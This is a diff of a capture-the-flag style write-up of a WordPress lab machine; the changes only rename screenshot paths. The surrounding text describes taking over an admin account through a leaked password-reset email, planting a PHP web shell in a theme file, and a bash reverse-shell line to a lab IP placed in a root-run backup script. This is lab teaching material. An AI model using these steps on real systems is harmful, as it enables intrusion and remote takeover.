@@ -241,7 +241,7 @@ MariaDB [wordpress]> select * from wp_users;
 
 However, this hash was unable to be cracked. I also could not overwrite it in anyway. I tried to reset the password of the `admin` user, but I could not get the confirmation link:
 
-<figure><img src="../../../.gitbook/assets/image (7).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (7) (1).png" alt=""><figcaption></figcaption></figure>
 
 Seems like the only way to exploit this is to somehow capture that reset link. Within the `wp_options` table, I found another active plugin:
 
@@ -261,21 +261,21 @@ It seems that `easy-wp-smtp.php` is also enabled. And within the `swpsmtp_option
 
 This file is located at `/wp-content/plugins/easy-wp-smtp/`, and from it we can get the password reset link:
 
-<figure><img src="../../../.gitbook/assets/image (11).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (11) (2).png" alt=""><figcaption></figcaption></figure>
 
 Once visited, we can reset the password of the `admin` and login:
 
-<figure><img src="../../../.gitbook/assets/image (8).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (8) (2).png" alt=""><figcaption></figcaption></figure>
 
 The exploit path to getting RCE from Wordpress is the same. (Appearance > Theme Editor > Replace 404.php with a PHP Web shell > Profit).
 
-<figure><img src="../../../.gitbook/assets/image (2).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (2) (1).png" alt=""><figcaption></figcaption></figure>
 
 > I reset the box here, so the IP addresses are different.
 
 From here, we can easily get a reverse shell.
 
-<figure><img src="../../../.gitbook/assets/image (10).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (10) (1).png" alt=""><figcaption></figcaption></figure>
 
 ## Privilege Escalation
 
@@ -308,4 +308,4 @@ bash -i >& /dev/tcp/192.168.45.162/80 0>&1
 
 Then we can place this within the `/var/www/html/wordpress/backup_scripts` directory as `backup-post` after running `chmod 777` on it. We would get a reverse shell as `root` after waiting for a bit:
 
-<figure><img src="../../../.gitbook/assets/image (3).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (3) (1).png" alt=""><figcaption></figcaption></figure>
